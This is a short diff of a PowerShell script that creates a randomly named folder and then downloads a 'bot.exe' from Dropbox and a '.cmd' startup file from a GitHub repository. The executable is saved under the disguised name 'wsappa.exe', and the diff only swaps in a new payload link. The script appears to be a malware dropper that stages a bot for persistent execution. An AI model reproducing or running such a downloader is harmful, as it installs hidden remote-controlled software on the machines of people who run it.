@@ -8,7 +8,7 @@ mkdir sVBXKuz
 cd sVBXKuz
 
 #download executable and startup file
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/rgj5n9whyfnzl4k/bot.exe?dl=0" -OutFile wsappa.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/pru08ccf2rgg1n8/bot.exe?dl=0" -OutFile wsappa.exe
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/1.cmd" -OutFile uesFNz8Ds9KS.cmd
 
 
